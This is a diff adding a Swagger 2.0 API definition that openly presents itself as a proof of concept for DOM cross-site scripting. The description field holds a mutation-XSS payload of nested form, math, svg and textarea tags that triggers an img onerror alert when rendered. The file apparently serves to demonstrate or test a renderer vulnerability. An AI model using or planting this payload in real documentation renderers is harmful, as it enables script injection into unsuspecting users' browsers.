@@ -1,0 +1,27 @@
+swagger: '2.0'
+
+info:
+  title: Proof-of-Concept for DOM Cross-Site Scripting (XSS)
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('DOM-XSS') src=1>"></form>
+  version: production
+
+basePath: /JSSResource/
+
+produces:
+  - application/xml
+  - application/json
+
+consumes:
+  - application/xml
+  - application/json
+
+security:
+  - basicAuth: []
+
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Proof-of-Concept for DOM Cross-Site Scripting
